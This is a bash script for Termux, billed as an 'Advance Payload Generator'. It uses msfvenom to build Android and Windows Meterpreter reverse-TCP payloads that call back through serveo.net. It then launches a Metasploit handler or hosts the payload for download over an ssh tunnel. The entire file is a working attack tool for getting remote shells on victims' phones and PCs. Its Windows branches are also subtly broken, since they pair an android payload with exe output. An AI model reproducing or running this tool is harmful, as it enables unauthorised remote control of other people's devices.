# !bin/bash
#Author:Dhruv Lohar

clear
printf "\e[31;1m _______  _______          \e[0m\e[34;1m _______  _______  _       \e[0m\n"
printf "\e[31;1m(  ____ )(  ___  )|\     /|\e[0m\e[34;1m(  ____ \(  ____ \( (    /|\e[0m\n"
printf "\e[31;1m| (    )|| (   ) |( \   / )\e[0m\e[34;1m| (    \/| (    \/|  \  ( |\e[0m\n"
printf "\e[31;1m| (____)|| (___) | \ (_) / \e[0m\e[34;1m| |      | (__    |   \ | |\e[0m\n"
printf "\e[31;1m| (____)|| (___) | \ (_) / \e[0m\e[34;1m| |      | (__    |   \ | |\e[0m\n"
printf "\e[31;1m|  _____)|  ___  |  \   /  \e[0m\e[34;1m| | ____ |  __)   | (\ \) |\e[0m\n"
printf "\e[31;1m| (      | (   ) |   ) (   \e[0m\e[34;1m| | \_  )| (      | | \   |\e[0m\n"
printf "\e[31;1m| )      | )   ( |   | |   \e[0m\e[34;1m| (___) || (____/\| )  \  |\e[0m\n"
printf "\e[31;1m|/       |/     \|   \_/   \e[0m\e[34;1m(_______)(_______/|/    )_)\e[0m\n"
printf "\n"
printf "                 \e[36m[§]Advance Payload Generator\n"
printf "                 \e[36m[§]Coded by : \e[31;1;43mDhruv Lohar\e[0m\n"
printf "                 \e[36m[§]Only for termux users\e[0m"
printf "\n"
printf "\n"
read -p 'Enter active serveo port: ' port
read -p 'Enter the payload name: ' name
echo ""
printf "\e[31;5m[$]Select a payload platform\e[0m"
echo ""
printf "\e[32;5m[~] Android\e[0m"
echo ""
printf "\e[32;5m[~] Windows\e[0m"
echo ""
read -p 'Enter platform(1/2): ' platform
echo ""
if [ $platform == 1 ]; then
printf "\e[31;5m[$]Select the type\e[0m"
echo ""
printf "\e[32;5m[~] Web payload\e[0m"
echo ""
printf "\e[32;5m[~] Simple payload\e[0m"
echo ""
read -p 'Select options(1/2): ' type
fi

if [ $platform == 2 ]; then
printf "\e[31;5m[$]Select the type\e[0m"
echo ""
printf "\e[32;5m[~] Web payload\e[0m"
echo ""
printf "\e[32;5m[~] Simple payload\e[0m"
echo ""
read -p 'Select options(1/2): ' type2
fi

if [ $type == 2 ]; then
msfvenom -p android/meterpreter/reverse_tcp LHOST=serveo.net LPORT=$port  R>/storage/emulated/0/$name.apk
echo ""
printf "\e[31;5mYour payload has been saved in internal storage!!\e[0m"
echo ""
printf "\e[31;1mStarting msfconsole...."
echo "use exploit/multi/handler" > handler.rc 
echo "set payload android/meterpreter/reverse_tcp" >> handler.rc
echo "set lhost localhost" >> handler.rc
echo "set lport $port" >> handler.rc 
echo "exploit" >> handler.rc
msfconsole -r handler.rc
rm handler.rc
fi

if [ $type2 == 2 ]; then
msfvenom -p android/meterpreter/reverse_tcp LHOST=serveo.net LPORT=$port -f exe R>/storage/emulated/0/$name.exe
echo ""
printf "\e[31;5mYour payload has been saved in internal storage!!\e[0m"
echo ""
echo "use exploit/multi/handler" > handler.rc
echo "set payload windows/meterpreter/reverse_tcp" >> handler.rc
echo "set lhost localhost" >> handler.rc
echo "set lport $port" >> handler.rc
echo "exploit" >> handler.rc
msfconsole -r handler.rc
rm handler.rc 
fi

if [ $type == 1 ]; then
msfvenom -p android/meterpreter/reverse_tcp LHOST=serveo.net LPORT=$port -o /data/data/com.termux/files/usr/share/apache2/default-site/htdocs/Payloads/$name.apk
apachectl
printf "\e[36;1mRun bash Msfconsole-attack.sh now!!!\e[0m\n"
printf "\e[36;5mTo download the payload go to a browser and type:\e[0m"
echo ""
printf "\e[36;5mhttps://payload.serveo.net/Payloads/ + payloadname.apk\e[0m"
echo ""
ssh -o ServerAliveInterval=60 -R payload.serveo.net:80:127.0.0.1:8080 serveo.net
fi

if [ $type2 == 1 ]; then
msfvenom -p android/meterpreter/reverse_tcp LHOST=serveo.net LPORT=$port -f exe -o /data/data/com.termux/files/usr/share/apache2/default-site/htdocs/Payloads/$name.apk
apachectl
printf "\e[36;1mRun bash Msfconsole-attack.sh now!!!\e[0m\n"
printf "\e[36;5mTo download the payload go to a browser and type:\e[0m"
echo ""
printf "\e[36;5mhttps://payload.serveo.net/Payloads/ + payloadname.apk\e[0m"
echo ""
ssh -o ServerAliveInterval=60 -R payload.serveo.net:80:127.0.0.1:8080 serveo.net
fi



